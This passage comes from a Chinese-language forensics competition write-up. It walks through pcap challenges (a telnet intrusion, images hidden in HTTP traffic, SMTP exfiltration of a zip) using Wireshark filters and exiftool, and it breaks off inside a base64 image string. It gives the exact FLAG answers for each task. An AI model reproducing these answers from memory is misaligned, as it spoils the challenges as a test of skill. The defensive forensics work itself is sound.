的telnet数据包。（后续发现了恶意用户通过3389远程连接攻击机2号192.168.90.139建立连接，再渗透靶机。所以过滤条件尽量放宽，或者仔细找找）\n\n同时，第三题中爆破成功获取到的密码的包是 **115479** 所以找只需往后翻。\n\n```\ntelnet and ip.dst==192.168.90.132\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/sdS2hKFB20Mxnot31710404925.png)\n\n有很多数据包，追踪最后一个流量包。\n\n这里也可以只过滤telnet，然后找长度比较大的包（长度大的包说明执行的操作多，可疑）\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/okLOsTBxIqy18uOo1710404925.png)\n\n**在161446号流量长度有 707** ，可能会有可疑数据，追踪。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/IaICoqdwEm8qkMyl1710404926.png)\n\n可以看到连接了telnet服务，并且执行了systeminfo，我们要找的OS版本也能在里面找到。\n\n这里中文乱码，修改下编码为 GBK。（我这里wireshark版本低不能修改这个编码，只能用kali的来）\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Yut1tPsFfM0FjAWM1710404926.png)\n\n得到OS版本。\n\n##### FLAG6: 6.1.7601 Service Pack 1 Build 7601\n\n\n\n### *网络安全数据取证（results.pcap）\n\n#### 1.从靶机服务器的FTP上下载results.pcap，分析该文件，将数据包内图片数量作为FLAG提交。\n\n打开流量包，根据题目要求导出http流的所有文件。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/zNj5Q0CojW9mRLMr1710404926.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/BSPnfEoTYngHlHIt1710404926.png)\n\n保存至文件夹，然后打开文件夹，全选所有文件，去除几个html文件后查看文件数量。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/K1cA4fa0eoaMnsmn1710404927.png)\n\n##### FLAG1: 418\n\n\n\n#### 2.对results.pcap数据包文件进行分析，将图片内隐藏的内容作为FLAG提交。\n\n将文件夹复制到kali中，然后对文件进行分析。\n\n先是尝试 ```cat  * | grep flag``` 运行命令后发现没有符合条件的文件。\n\n此时要想到jpg图片，存在图片头部exif信息，所以我们可以用**exiftool** 去查看所有文件的头部信息，尝试运行以下命令：\n\n```\nexiftool * | grep flag\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/1sNvUmmgb9f3fQ6T1710404927.png)\n\n找到了flag，还缺少了一部分flag。\n\n这里将输出结果都保存至文档中，我们再根据关键词找对应的图片。\n\n```\nexiftool * > res.txt\nvim res.txt\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/kXmJz0rcUMafphO71710404927.png)\n\n找到了该图片为 90(2).jpg\n\n##### FLAG2: flag{ae58d0408e26e8f\n\n\n\n#### 3.对results.pcap数据包文件进行分析，将额外信息文件的关键词作为FLAG提交；\n\n这里继续分析数据包，对90.jpg进行详细的分析。\n\n```\nhttp contains \"90.jpg\" //过滤出90.jpg的图片\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/x2IID7TYgqri3DS21710404927.png)\n\n过滤后追踪查看，发现只有该图片存在 **Exif** 字符串\n\n一般存在Exif字符串就说明图片被修改处理过，是一个特征。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/KpAEu3GdO7KZE5K71710404928.png)\n\n用过滤语句验证下。\n\n```\nhttp contains \"Exif\"\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/i5VS6fNEKhewld3o1710404928.png)\n\n能发现确实只有这一张图片存在Exif字符串，所以Exif就是关键词。\n\n##### FLAG3: Exif\n\n\n\n#### 4.对results.pcap数据包文件进行分析，将过滤语句作为FLAG提交；(不包含空格)\n\n直接将该关键词在tcp流中过滤。\n\n```\ntcp contains \"Exif\"\n```\n\n##### FLAG4: tcpcontains\"Exif\"\n\n\n\n#### 5.对results.pcap数据包文件进行分析，将数据包内完成字符作为FLAG提交；\n\n 过滤后能发现存在两个TCP流：![](http://cdn.anyiblog.top/WriteUp/20240314/ouuGIq6kni20TNlo1710404928.png)\n\n刚刚有一个是HTTP的，那么另一个就很可疑了。\n\n追踪最下面的流，找到了另一半FLAG\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/nxCqxqdjTnseKiZM1710404928.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/4oTeoL5nUuzyhLYc1710404928.png)\n\nflag就是两者拼接一起的结果。\n\n##### FLAG5: flag{ae58d0408e26e8f26a3c0589d23edeec}\n\n\n\n### *数据分析（wire0077.pcap）\n\n任务环境说明：\n\n服务器场景：FTPServer(关闭链接)\n\nFTP用户名:infoacq密码：infoacq\n\n#### 1.  从靶机服务器的FTP上下载数据包文件，分析该文件，找出黑客入侵使用的协议，提交协议名称。\n\n下题提到了zip压缩包文件，如果找到了该文件 就能找到是哪个协议被入侵了\n\n```\ntcp contains \".zip\" //查找带有.zip的请求\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/V7088sZJh5o62KOd1710404928.png)\n\n\n\n##### FLAG1: SMTP\n\n#### 2.  分析该文件，找出黑客入侵获取的zip压缩包文件，提交压缩包文件名。\n\n追踪TCP流，在内容中找到了传输的文件名和文件内容：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/dUzfZV5bWMjbzOrJ1710404929.png)\n\n##### FLAG2: DESKTOP-M1JC4XX_2020_09_24_22_43_12.zip\n\n#### *3.  分析该文件，找出黑客入侵获取的敏感文件，提交敏感文件的文件名。\n\n这里用 **imf** 协议过滤 \n\n***关于imf协议的解释：**\n\n```\nIMF(Internet Message Format)因特网消息格式。因特网消息格式是指文本消息在因特网上传输的格式。 其中SMTP等价于邮件信封,IMF等价于信封中的信件。\n```\n\n我们过滤imf协议可以更快找到SMTP传输中的信件，也就是传输内容。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/CVSl62FlULH6FxfS1710404929.png)\n\n有两张图片，是除了刚刚的压缩包之外的文件。追踪第一个jpg文件，找到文件名：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/VVoQKOA2DymItplN1710404929.png)\n\n##### FLAG3: DESKTOP-M1JC4XX_2020_09_24_23_02_08.jpeg\n\n#### 4.  分析该文件，找出黑客入侵获取的敏感文件，提交该敏感文件泄露的时间。\n\n这里应该是第一个图片访问的时间\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/oNEvw3oRi0GsFpaj1710404929.png)\n\n##### FLAG4: Thu, 24 Sep 2020 19:02:09\n\n#### 5.  分析该文件，找出黑客入侵获取的敏感文件，提交该敏感文件中泄露的文件夹名称。\n\n这里题目的意思就是让我们先还原敏感文件，再分析敏感文件中泄露的文件夹。\n\n所以这里先还原，内容是一串base64字符串，用python处理下。\n\n```python\nimport base64\ncontent = \"\"\"\n/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0o\nOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8a\nGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2Nj\nY2NjY2P/wAARCAOEBaADASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQF\nBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEI\nI0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNk\nZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLD\nxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEB\nAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJB\nUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZH\nSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaan\nqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oA\nDAMBAAIRAxEAPwDvqKKKACimPIkY+Y4qB7z+4v4mgC1RVaOZ2XJOalEoPXigCSkpM5oo\nAKM0hNITTAKQ0ZpCeKAEJpM0hNNzTEPzS5qPdRuoAkzRmmZo3UAPzRmmZozQBJmjNMzS\n5oAcDTs0xTTqQDgaUGm0tAxxNMzQTSZoAXNGaTNGaBC0ZpuaM0AOzSZpM0maAHZozTc0\nZpgOzRmkzTTQBIDxRmmBqXdSAcTSZppNGaBjT1pKDSZpki0UmaM0ALSUmaM0DFpKTNBN\nMQGkopKAA00mgmmE0AIxqNjSs1RO1MQ1zxUDtTnbNRk0EjTxVeVqlkaqrkkmgCCQ5qs6\nbqsuKjIoBoqOmKgIq66ZqF46QrlbFNK1MV9qaVqSiIrSYqYr60m2gCArTcVOVppWgBkY\n5rrNDKpajHU9a5UDBrY0q7ETbWOAaaA6oP6GhpMLyaz1nUjKuKiu7xLeItI2fQZ60FXM\nXxPMZLtFxwBWLVm9unu7hpG/Ae1QpG7nCqTWUtWQhmKXpV6LS7h8ErtB7mtKDQBsVpHJ\nJ7Clytjuc/gk9Kd5b8Daea6v+y7ZIwqoAw7moBa7X2yKCB0p8gamVb2+F5q3BZyXEoRK\nnkhETgLyDXQaPZqEDkcmrSCxnweGw3MjE1PBoS2UrSp83HHtXQ7cUhWmVymIOG5q2CGX\nNQXxSO4IyBntVWfUorOEs7j2FMLpF6J8SMvvUkj7QK5dvESgs+zJPSqja/Mzlj+VF0Lm\nOruLuKCIvI20Vymoa4zMUtjhe59azb3UJrx8yNwOgqrUOXYdm9yeW8nlI3OcDtUJcscs\nc02gmou2OwUUlGaBjkOHFdj4YnyGQn3ArjPeug8Oz7LpB/e4q4EM7cAVm69D5umzKB2z\nitNTxxUV0gkhdW5BGDVDlqjjfD9sJbwbuijNdei7R1rH8P26p5rEfxYFbvykdKewo66m\ndqkzx2MuODtPIriYlMjlmOTXTeKbpordYUOPMPP0rnrKJmcLjJPSpluT1Oi8PWe5TI6/\nKOldEuFULjis/SYpIodjrgVd3AdTiqLiZPiDUvsEIWMfO449q4pmLsWY5JOa2/FN3HPd\nIkZzsHJrC7VlNkrV3CkpaKgoQ0x24pWbFR/eIFAGjpaESoqjJc16DaIIYFXvjmuN0SEG\naNAMv613MaKqANycVuthR3M3Xrp7bS5pYuHA615xksxZuSTkk12/jG5MGniFRkSnBPpX\nEoOlZVGJayY4CnYoApQKxKAU4c0mKcBSJFxQBS4pcVIhuK3NHnJKEdQeTWIRWnpT7YyF\n6k1rSeoHeRvlBgZ4rkvFEO7VoXcEAp/I11GnN/oq5OWxVLxBCklqpYAuGG31rokrjlqj\nI0mxWe6XcPlXk11XkIE2hQBVHTrAQQKzffI5qvrOtDTkMf3pWHyim9EGiOW1y8uJr6SB\n3ykbEACszFPkdpZWkc5Zjkmm4rilK7uNKyExSEU7FBFK5RGaKcRSGqAaaYaeaaadxDDT\nGFPNI1WhELUw1IRTCKtAMNMNPNMNUA00hpxphqiiaxadL2N7UMZlORivR9MvUws1ygWc\nDHTJFcj4Mlto9VYXGMsmEJ9a67S7Sd/EEkzr/oq/6v0zWi2Ik9TC8a+IZLuMWEcTxx5y\nzOMbvTFcXXpHxINt/Z0AIHnl/lx1x3rzc1BUQpKKKRQUUUUAFFFFABRRRQAUUUUAKASc\nAcmu/wBEM2mCCzvjFLcKu6KNhlowe2a4FSQwI6g8V6Bp1zCyR61qltdLdRIoO0cNjo2O\ntVEiZg+MrzVJtREGpRiERjMcaHK49c965ytfxLrTa3qbXGzZGo2xr6D3rIqSlsJRRRQM\nKKKKACiiigAooooAK1fD0l+mpp/ZyhpSCGDD5dvfd7VlV0HhK8ht7q4tpmWP7XEYhK38\nBqo7gdBPe3i6V9m0RbZJDncIASx5OdpJrg5o5IpWSZWWRThgwwQa9E8P2KeHElvtTmiR\nApCjdknnt9a4XWL46lqdxdldolckD0HanIFsUaKKWoAKSiigAooooAKWkpaBnvtFFFAi\ntPxJ9RUJVT1GPpUt9IsMRlbO1QScelc3Le3xaa9tpg1qOilenTjH65rWFNz2MqlVQ3Oj\nQBU6/nUb3MS99x9qitblbuwWZQRuXke/eq1Q1Z2ZakmrotLdO8iqgC5OPU1oVl2i7rlP\nbmtOkMKYTTjTTTGNLU3dQ1MoEKTSE00mkJoELmjdTM0ZoAkzS5qLNLuoAkzRuqPdSbqA\nJg1OzUAanqaAJlNPBpgp1Ax2aWm0ZoGBOKTNNc80maBD80ZpmaM0AOzRmm5pM0AOzRmm\n04UALilxRmjNACZppNONRM2DigBS2KcGBqPOaTNAiYGkLUwNRkUALmkzRmmmmA7NJmm5\nozQA7NGaZupC1AD80m6o91JuoESbqTNM3UhagB5NRlqQtUTPTEK7VC7ZpGeoy1AgJqN2\n4oZqhY5oAbIxNRHmpCKYwxTQEbCo2WpsUm3NAFfbSFM9as7aaUpAVHiBqIpjtV0rUbLR\nYLFJlpuKsumKhZfapC5GRTSKlETt0UmrEFhI7fMMD3oGUliZjxUmxk6Gr5tjGcEflWpp\nujrN88oyKLCOdEswGVJpCJbl1UkknoK7uPTLeNcCNcfSqkmixJcefEuMfw0htGDb6ADj\nzG/AVof2WkYUQjGOtXUGH5qYDmiyGolOOMFwjDAqwVCsPSmXHyy5FOaRSF55pjCUdDVS\n56LU0twir8zDA6nNY19q0THEWWxSuJtFsrulj7810lgdsY7Vy+jmS4ZpW5x09q6KAsg5\nNUtiV3NOkYgDNVftAXqcVlaxriW0JAbLHoKVi3JIxPFF+f7SCwt0GCRVPT7N9RYyTMdi\n1QLvd3TO3LMa7LTbRIbNEAye9StSEigNItRGV2Zz3NYep6c9n845jJwDXaPED0GDWJ4i\nXGnnPUMKGkW9DlKSlpOgrMoKaaM0UAFFFFABWjpUxSZSDzms6prV9suPWqW5LPTbV/Mh\nVt2eKlcDbWZoU4lsl/2eK1cZrQFqila25Qvu4+YkYqy64HHWnugBFQysUUnOBQC0Rx2v\nzCfVAuc7Bg/Wrvh+1WS48xx93oKyJR52qSGP5iz8fnXY6faJbRpx82OaS3uZxLnHasfx\nLPJBYbojtJOM1sTSoiF24AGTXF6/qwvnEMX+qQ5z6mhuyLk1sY5JY7mOSaMUUE4rEAPF\nRs1DNTKQCE5oTO9cdc0U+AEzLgZoQHW+HYQZldeT3rq8DHXmud8OL5KlepPet12KKWbg\netdAROR8aXscjxWqcuh3N7VzK1d1yZLjV55IzlSeDVNa55u7FHuPFOFNFOFZsYo5pwpA\nKUVIhRS0uKXHFSIbT4HdJRs6k4pMUIxSRWHUHIprRgdfb3bQxAAkn0rTgtDdRrNcZJ6g\nZ6Vh2EqzBXYY9jXSW9ygiAPAFd62GrMjubhLJR5rALjqa4bXL8ajfmRfuKNq1o+K9RS7\nuEgiOVj6ketc/iuarPohbiUUtJXNcsQ0hpcUhpoBpNNp5FNxVCEIppp1IapAMNMYU80w\n1aEMNRmpGphq0MiIphqQimGqAafpTDTzTDVIpGp4d0uTU75gjFFiG4sK7zR7ia4lktLd\n13RcM5GcVw3hi8ubPUswIzqw2yAenrXoGnyWGmRy3KnDS/M+Mkn8K1WxnLc4Xxla6hba\nt/p83nbxmNgMDHoB2rnzW14p1k6zqbSgFYkG1FPpWLWZcdhtFLRQUJRRRQAUUtJQAUUU\nUAFFFFAGn4cltoddtHvADCH5yMjODg/niuz0Ky1GXXJXvY5DCJWLEkFenA+lcTpOmSap\nctGjLGkaGSSRuiqO9dMlvfX+lCHRtRupRGp3I7Y3D/PSqWxD3MPxYbM6/cCwVViBwdvT\nd3x+NYtPdWV2VhhgcHNMqS0FFFFABRRRQAUUUUAFFLSUAFbPhnSotV1BknYrDFGZHA6s\nB2rGrQ0WW7h1KJ7FDJMD9zsw7g+1VHcDqtKsYPEhNs8CwQxAkFOqjOBXJ6xZJp+qXFrH\nJ5ixOVDetdrcaleWOnSf2fZwRXMmfMZG3EH2rgZxKJW84MJCctu65qpCWxFS0UVmMKSi\nigAooooAKWkooA98paTNJmmBBfRLPbNG/wB1hg1z1st5pVnc74FcAjaQeD1yT+ldHOcQ\nsQCcdhVAzCQFcjngg1pCpyrleqMp0+Z8y0ZT0S5nuILjzFUQqcR4AGPUfyqWp2dlRsGq\nYmPcUpyUpXSsOEXGKTdy/YD96zegq/mqOmurxuykHnH+fzq0TUFjyaaTTSaZu5pgOJqN\njSk5phoEITTaWkNMBM0maKaaQC7qN1NzTSaBEm6mlqiLUm7NAE4epUPNVkBJqzGvGaAL\nKninZqBWxTw1BRLSHikBpHbikA1zTQ1MZqTdTESZpQajBqQUAGCaXpRml60AJmnjpUR4\n5pytmgB+aTdTGbFR+ZzSKJ81C7fNShvWo2OWzTJY7NGaZmk3UwJc0bqi3cUm+gCbNIWq\nHfSGSgB5akL1XMo9aQy+9BJYL00vUHmUhkoC5PvpN1QeZSh6YXJ91NL1HupjPQK49396\nhZ6QnNMNAbilqjLUppvWgBrGm0/FGKQxhFIRmpMUmKYWIitG2pMUuwntRcRFtppWrSW7\nOcYqZbIZ+Y5NFwM3ZntSi1kfoprWNsqYCjmrGwImMUD1MI6fIRnv6U+KxREBkXLe9a2w\nZpJ4wUJx0pBYqwwoqnCgA+1NeDaCy9KsRgFcelD/AOrYUFWIIYRK4VhkVv28YSIAVjWx\nCuD0rYgkBWgS3JsUhGBS5BpsjhV5qSzNlQeY31qN5BGpLcKO9PlbcxPrWRrJlW1bDHaa\nZDbSK9/rC7z5POOKy5NTuXz82M96rsKYRWTkybdxXmlcYZyRTY03Gg1c063M1wijuahX\nbDRHSaNamKzX/a5rSKMo4OaII9kYTOAOlPIK/SuguK0M3U7v7PZu54I6VxEsrzOXdiSa\n6TxRdBUEI5LjJNc0gyazm+hK1dzU0O3Et4mRwvJrtIyqcAcVgeHbbYhlbgNwK6DaAuKu\nKshxByhUk1w+v373F28IOI0PSusvrhbaB2kO0Y6159K2+Vm9TmlJ2QPViUhpaSsyhKTv\nS4oxTGJRRRQAUqnawNJS0COv8M3XzmMtheorqom39+K850e5McvXGK7zS5xPbhiMVrui\nUW5B8tc74kvJIbTyQ+Gc9vSujYZHHFcV4lPnaqsanJVcEelAph4esTPJ5vQL3rsPKG0c\n81maFEYbIJsw3U1pbsUDj3MrXbuO1sJVdvndSAK4QGtPxLP5urSAPuVcDrxWVWU3rYS1\n1HbqQtSUlQUFJS0vakA3FaGmoNpOMsTiqJrR0qMhg2Mlj0qobieh2uhQKltuPLGtCdFk\nhdWGVIwagsYTDAuepGTWf4m1GWxsMx9ZDtz6VuxbI4KdFS5kVegYgfnSLSckk04VyvcF\nsOHWnAUiinAVICilxQBzTgKkQoHFLQBS4qQEq3pcC3F4A/3QM1VqS0maC5V0GT0xVR3E\ndH9n2yJ5ZxkgV0sdrGIAhXII5rBsZA+1261rT6nFawF5WCgCu57FXW5xviGxjstSZIuE\nI3Y9KzCOKtanetf3rznvwB7VVPSuCe7sShpppp1NNZlBmkoNJmqGBpp69KcTTCaaEJSG\nlJFNJq0A1qjNPJphq0IYT1ph5pxppq0MaaYaeaYaYxpqMipCaaapFXOt8GS239n3sOB9\nqPzD3GOP1rpvCVncQ20kl8hErnjd6V53pFnfyzieyDJsPL9hXR65q+tW9uI4nAjK/M0a\n8itehDWpieMGtm8Q3JtVAXODjpu71h05yzEljkn1ptQWthKKWigYlFFLQAlFFFABRR2o\noAKKWigZqeHrqW3vzGkMk0dwhiljjHzFT3H0611J1Oy8K6e8Vslw95NGMeYm1fr+GawN\nAYy2F9Z2xC3s20oc4LKPvKPf2roNbWGw8LSQ6kEa+lYeWpYMygd/biq6EPc4KR2kdnY5\nJOSabSnrSVJYlFLRQISiiigAooooAKKKKAFrrfBEkKxagij/AE148RfTnP64rkqtac12\nl5G1iX8/Py7etXF6iZ2ng2xum1Ivcxv5Ue7k9N2ayfH91b3GulLdV3RIEkYd2/8ArVfv\n9U8QR6WqK8cbEYfyh81cXJv8w+ZnfnnPWnIFsMooorMYUUUUAFJS0lABRS1ctNMubpd0\ncZ2ep6U7XA9toqOeVYYWkb7qjJqoNVt/OePzEJjcRvtJ+VjnGcgehoAvVHLDFKP3iBvf\nvS+dF/z0T/voUnmxtyJFP40CKz2PURzMoPZhuqOPSoAczM0p9CcD8hViW7iQL+8QlmCg\nbu5pttew3MQdXUZOMZoAmREiXbGiovooxSmqcuowxSLGzoGeTy0DE5ZuOBx7jrTbbUoL\nkAq6DPq3IpgXDTDQHVhlWBHsaQ0AIaQ0pppNMQhphNONNNACU0mlJphNIAJphNDNUTNS\nEDNUkQzzUKgswFWwNoAoAUVNG3aohTlNMZNRnFNDUMcmgCVeaVl4oQYFKTQBGUzUTAqf\narNMYcUARLyakzUDNsan7we9AEuaXNRbxSFvSgB7tgVCsvPWlJO05qvt54piLDS8etIh\nJPSnRpheetSDApDImLA+gpu6pmGaglXZyOlAATTGfik3VDI+M0APaXFRm4GetVbicKOv\nNUnnJOc0XJNY3C+tQyXW7gdKymnb1pBOaVwNPzqXzqzRPTvP96dxGh51J5tUhNS+Znoa\nALokzUgaqcbZ71ZU8Uw3JS1NJppNIWphYXNITTc0UDFpKUAnoKkSBm5oAipcVZjt1LfN\nzUvkAcgcelAFEIzHAHNTJbEnk1dSMYzjBpwj596B2Kv2RF5AzTwi7duMVYVcdaR0+YGk\nOxEkXljPrUiDPXrT/wCHFGMUANUYbNPdeaaGH0pj3CA9RgUBcHAC0x2Xyjk4qOS7Qj2r\nLu53lPBwvamJsuh9pyCKqXOpRr+7Xk9zVB5H5G41AVqRal5b/c2BwK07e/2qATmucxzS\nqWyME0uYR18V8HYDPJqwx39TxWDo0btudiSe1bSkheRTKQjxdxWNrzYtQo7mtoyKBzXL\naxO810yHhVPApPYJmURTCKmYVGRWBJHjJArofD9qSWk9OlYcSF24rsNKgMNqnuMmrgtQ\n3ZoKvy9eajlby0YscDFOIx3rL168+zWRI5Y8CtS5OyOX1e8+2XZZfurwKjsYTNMqAck1\nV5Zvqa6Hw5a7pfOYfKvFYr3mRsjpLaFIoUVR90YqVs444NKvyDpxUVzMsMZc4AA6mti9\nkct4rndpYk38YORXPHmrN9O1zdSSO27J4+lVjWUndijsJS0UUihMUlLSUAFJS0lMAooo\noAv6Ym5mJ4xXeaGd9oqrwFrgtObPyDg5rvNDYLbhB1rSOxPU1CnykVzf9nB/EMkknKgb\nhXSHOKqvEn2jzMfNjFNBJXsKvy9OKwfE+pTWUaJDwZAQT6Vt3U8VvEZZDtUda4TXdU/t\nK6BTiNOF/wAaTdkKWuiM0ku25jknqaKBS1zspDaKWikMSjFLRQAYrotCgBeNMZeufRWd\nwqjJNdVoSMkiHBLmtKa1JZ1aKBGAeoFcj4zvMtHZhenzk11jMVj3MCMCvPvEF8t/qTPG\nPkQbQfWrm7IUuiMwDNOAoFOFc4wFPFMFPApCFFOFIBThUsQ4UUg4pakANaOiQpJK7PyQ\nOBWd2q7pMcjTl1OFHBq6fxCOhs7YPfxgA7OSa272zguLV45UUrjv2rP0xWkcleMDrUfi\nW+uLKwwi58w7d3pXZK1h7JnEuAsjKOQDim0nf3oNeewENIaWkNSAw0maU000xik000Zp\nDVWEIaae9LSVaAaaYaexphqkAw0004001Yxp6U0inGkPSqAjIprCpDTWFUM7Hzl/4Qm3\nFhnzAwEu3qOea6Twva7dOd7mNg7HBEg7Vy+jxf2JpMF9K7N9rYbY/wCH2Nbuttqs/h57\nm3lSFdmXQD5iv1rV7EbM4DX/ALP/AGxdfZVAi8w7cdPwrOp5Byc00iszRbDaKXFJigoK\nKKKACiiimAUUUYoAKKKKBnS6YkVlpNndW8ay3E85WVyu7ywOij0J61b8VaXbpo9rqUj7\nLycjKeox6eoqLQLDUrDMnnRQb08wQyDcScfKxGOOT9ax9dn1O4vN2qMzOBhcjC49scYq\nnsStzMpKU0lSUFFFFABRRRQISloooAKKKKACuw8Dm2WC+Y4N5txGO+MHp+OK4+rFjeTW\nFys9u+1x+vtVxaTEzufB9rdz6i73quUjz97oWzWT8QpLRtZWO3RRIiYlK9z2p8/jLUk0\n2MQpFEzjBcDmuUlkeaRpJGLOxyWJySaJDWwylooqQEopVBYgAZJ7VcTSb2QgJAzMedoG\nTRYClRgnoKkkheJ2SRSjKcEEciux8MS6NHAXuDEGVf4x371SjcDm9A08alq0Fu/EbNlv\noK7DxOw0q2hitUCg8ZA6CsSSKe51l73Sk8mNn/dADGe2ce9dNeObW3hfWYlCMQGYnIzW\niRDOg1ZGk0u4ReWK8VyNy8jXz3MkSiKK9WVRHHt8+MnB3AAZYdi3qRmu54IweaYYoyMG\nNcfSsSjk3mv2lDNPANyMsc8XmnYcgjcHyRkAjjOM0Xt1cwwyMtwXmTAiK5IdnGOc+hBb\n866vyosY8tP++RVR9NjknSR3JVDlU7Ci2gXOdha4EduZZ9sUTQloMNlSpG49MHJBOevN\nJpD3Js4beIRRhd4kSTzAzEsSGGDtPBHUZGK61oo2OTGhPuopPKjzny1/KgDl79XW4jBk\nhUJcmSRXhLuyFVHyNtO1uDyCv1rKtLi5trVIrYyRSrZyRoCpyrGbcBn129/613bRxscl\nFJ9xTTFHnPlp/wB8iiwXMnRJ7ieV2mJb91HuJBGX2jd+ua1jSBVX7qgfQUE0xCGkNBpp\nNMANNJpSaYTQAhNRsaVjUbGkIRmpp+lPWJmqVYMDk0gI4lOc4q0I+OaSNCvWpVpjGhAB\nTGBFWOKYQDQMr7z605JMvUNy4i/GoYZCG560iTXzwKBUUT7hipAaZQ7NITxSE0x2AFIC\nndPiSofPwOTUV5OHmwtSQ2jTAE9KdyCRJg3Oaso425pEskWiWAqvydPSgeox5N1EIy/N\nQFipwalifkUAXDSClBBGaTdigoXNV7t9sVSk1napcpHCQWwaQmMM4XknA9apXF7yQhqh\nJdNJxnAqPfU8xJM8rMck1GWqPfSFqVxDy9JuqMtmkzSAm3Uu6oA1ODGmBMG96kQkkc1X\nDE9BVu3idiPlqkK5aiHAqwOBSQWznjpVoWoA5NWNFcZPSniFyOmKtwwCMEgZzUu3JAFA\n7FJLZv4+KmFqhGKtBc8UgG1sUDsU5I2RvUVYRdsYHc1IUzmkTkYoC1mCrx708LQOAaVT\nQUJjnFO6EVGzgNnPFRvcgcmgVywcZpjuAaqSXRP3eDULSuwxmiwrlqS4XOAaiN2c4HSq\n9GKAJJZ2YYHAqAknvT8U0igCNhUDirLCoHFAis61EVxU79aYRSGQEUscZZuKVhV7TYPM\nnUenNT1Ea9hbmGFRjGeTVxhinKnyjmmspFUWtilfzpbw7zyfSuXmkMsrO3UnNbOuOuAm\nfmznFYxFRJmb1ZA45qJhzU7iowu58VmBc0q0M1ygxx1NddEpVcYwKy9BtSsHmkcnpW1j\njrWsVZFR7kTMB1Ncdr9951w0CD5UPP1rqdTmS3tHlf8Ah7Vwsrm5umk7uc0pvQT1diOJ\nSZABzXbaVELe1WMdeprmbO2aSdVTkk12ttZBI1LElsc0QVgW4u84xXO+KbrFuIQ+GJ6D\n0roLqNokZ0OQBkivP9TujeXjycgZwKpuyG9dCpSZ5p1NrEoDSUtJTBBSUtJTGFJRiigA\nooooAnsyRONvXtXd6Gdtuck7q4XTyBeIT2rrtIlczgA8GtIkHSoHYegqKYbDknA9atoR\nsGKpaw3l6bO4bBCkg+9Mb0VzB8U30SWDW4YNI+OM9BXGgU+WV55C8jFmPc02sZO5KXVi\n0UUVBYUlLRSASlopaBFnTmVbjnqRxXZ6DGiku3U9M1yenWysvmNyc8V2uj2e23WR85PT\n2renohGm+0KScYrzHUjGdRuDH90yHFdn4oae30tngk2gkBvpXCAHvU1H0FvIPSlFFKKw\nKDHNOFAFKBSEOFOFNApwFSyRTQKMUYwKQAa1tGSQRu+P3Z6VknpW7o1yr2qxD7ycGtaO\nsg6m/osm4PtXocE1l+M7oiKK22EbjuJra0hFtrcqTksxY/jWB4yu4pJIYEwWTJPtXRV2\nYPY5ikNOpK4GMbRSmkpANNNIpxpppoBpppp5puKpANpM0ppDVIQxqbTm60w1YDTTTSk0\n01aADSUUhpjENMPPSn008HNUhnY2kC2uk2trrLAkt5kMZPKj3q/4rv7pPD6R2lqyWkig\nNIT0HpVKBE8UPaXT3AgkgTy5QR+oq14v161j0oaZayrLIwAcp0UCtZbEHn9JinHrRisj\nUYRSYqTFIRmncBmKTFPxRii4DMUYp+KMetFxjcUlOxQRzQMbVjT5YoL+3lnXdEkis4x1\nAPNQY96dHHJNIscSM7scBVGSTVLcDsrjTtRvfEE09uhkhn2uHU8eWeRz+FO+IN7bAWun\nwhWkhGXPUrwMCs5bbXNN0YpHPLEd+TGkvIXGMAD3Jrm3LM5LkljySeuaqQojKKWkqBhS\nUtFMBKKWigBKKKKBBR3oooAKKK2/Cujrq+oMsn+qiXcw9fQU0rgNvVZ9EtAiZxycD61j\n+1dhe3yJqf8AZ0EAKKdgAHetHXfCNpFoz3YcxzRLvPofaqaErnn1XNKshfXyQu2xTyTV\nbcqn5Rn3pFldXDKxDDoRSVluB6Jpfhawt4jfStzHkrk8AY6mruk3thCk19LPGqsMDJHA\nFeez67qM9p9le4bycYKjjP1rOycYzxV8yQWNLxDqKaprNxdRLtjY4Uew4zVWyspr2Xy4\nVzjkn0qtW/4Vv47S4ljkX/WAYP07VMdWDOp8OxMhjiKbpIgMjFZfj/VpZZI9OMLRop3s\nWH3vTHtXT6O9vapNcySAGX5iSeBXB+MdXj1fVy8H+qiGxT/e96qYonq2aM0maKgYE0Zp\nDRQAE00mhjzTCaBCk00tSE0wtTAcWppNNLU0tQA8mkzUe6k30APJpjGgtTSaQhCaWNcn\nJpKnRcLQAqgk